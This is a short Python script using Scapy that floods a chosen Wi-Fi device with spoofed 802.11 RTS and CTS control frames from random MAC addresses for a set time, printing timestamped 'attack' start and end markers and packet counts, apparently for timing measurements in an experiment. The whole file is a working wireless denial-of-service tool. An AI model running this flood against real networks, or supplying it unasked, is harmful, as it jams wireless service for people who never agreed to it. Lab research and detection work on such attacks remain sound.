#!/usr/bin/env python3

import random
import sys
import time
from datetime import datetime

from scapy.all import RadioTap, Dot11, sendp


def mark(label: str) -> None:
    print(
        f"{label}_ISO={datetime.now().astimezone().isoformat()} "
        f"{label}_EPOCH={time.time():.6f}",
        flush=True,
    )


def random_mac() -> str:
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(
        random.randint(0, 255) for _ in range(5)
    )


def main() -> None:
    if len(sys.argv) < 6:
        print(
            "Usage: sudo python3 tools/rts_cts_flood.py "
            "IFACE TARGET_MAC DURATION_SECONDS INTERVAL_SECONDS MODE"
        )
        print("MODE: rts | cts | mixed")
        sys.exit(1)

    iface = sys.argv[1]
    target_mac = sys.argv[2]
    duration_seconds = float(sys.argv[3])
    interval_seconds = float(sys.argv[4])
    mode = sys.argv[5]

    if mode not in {"rts", "cts", "mixed"}:
        raise ValueError("MODE must be one of: rts, cts, mixed")

    mark("SCAPY_ATTACK_START")

    end_time = time.time() + duration_seconds
    sent_rts = 0
    sent_cts = 0

    try:
        while time.time() < end_time:
            source_mac = random_mac()

            if mode in {"rts", "mixed"}:
                rts_packet = (
                    RadioTap()
                    / Dot11(
                        type=1,
                        subtype=11,
                        addr1=target_mac,
                        addr2=source_mac,
                    )
                )
                sendp(rts_packet, iface=iface, verbose=False)
                sent_rts += 1

            if mode in {"cts", "mixed"}:
                cts_packet = (
                    RadioTap()
                    / Dot11(
                        type=1,
                        subtype=12,
                        addr1=target_mac,
                    )
                )
                sendp(cts_packet, iface=iface, verbose=False)
                sent_cts += 1

            time.sleep(interval_seconds)
    except KeyboardInterrupt:
        pass
    finally:
        mark("SCAPY_ATTACK_END")
        print(f"SENT_RTS={sent_rts}", flush=True)
        print(f"SENT_CTS={sent_cts}", flush=True)


if __name__ == "__main__":
    main()
